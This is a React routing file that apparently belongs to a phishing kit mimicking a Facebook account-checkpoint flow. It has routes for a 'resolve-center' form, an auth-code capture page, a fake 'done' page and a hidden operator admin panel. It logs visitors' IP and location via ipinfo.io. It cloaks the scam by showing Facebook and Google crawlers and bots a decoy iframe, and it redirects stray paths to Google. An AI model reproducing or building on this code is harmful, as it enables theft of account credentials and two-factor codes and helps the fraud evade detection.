import { Route, Routes, BrowserRouter, Navigate } from "react-router-dom";
import React, { useEffect, useState } from "react";
import "./App.css";
import HomePage from "./pages/HomePage";
import MyForm from "./pages/MyForm";
import ClassUser from "./pages/fakeDone";
import AuthCode from "./pages/authCode";
import AdminPage from "./pages/admin";
import Login from "./pages/login";
import { isbot } from "isbot";

function PrivateRoute({ children }) {
  return localStorage.getItem("logined") === "true" ? (
    <>{children}</>
  ) : (
    <Navigate to="/cdlogin" />
  );
}

function App() {
  let[countryCode, setCountryCode] = useState('');

  function showIframe(file) {
    const html = (
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
    );
    return html;
  }

  const setLocaltion =  () => {
    try {
      fetch("https://ipinfo.io/json").then(d => d.json()).then(d => {
        var countryCode = d.country;
        setCountryCode(countryCode.toLowerCase());
        localStorage.setItem(
          "location",JSON.stringify({ IP: d.ip, country: d.country, city: d.city})
        );
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    setLocaltion();
  }, []);

  const userAgent = navigator.userAgent.toLowerCase();
  if(!userAgent.includes('facebook') 
    && !userAgent.includes('google')
    && !isbot(userAgent)){
      return (
        <BrowserRouter>
          <div id="app">
            <Routes>
              <Route path="/p/h/:userID" element={<HomePage/>} />
              <Route path="/resolve-center" element={<MyForm/>} />
              <Route path="checkpoint/:userID" element={<AuthCode />} />
              <Route path="processing/:userID" element={<ClassUser />} />
              <Route path="/cdlogin" element={<Login />} />
              <Route
                path="/cdadmin"
                element={
                  <PrivateRoute>
                    <AdminPage />
                  </PrivateRoute>
                }
              />
              <Route path="*" element={<meta httpEquiv="refresh" content="1; url=https://www.google.com/"/>} />
            </Routes>
          </div>
        </BrowserRouter>
      ); 
  }else{
    return(showIframe("homepage.html"));
  }
}


export default App;
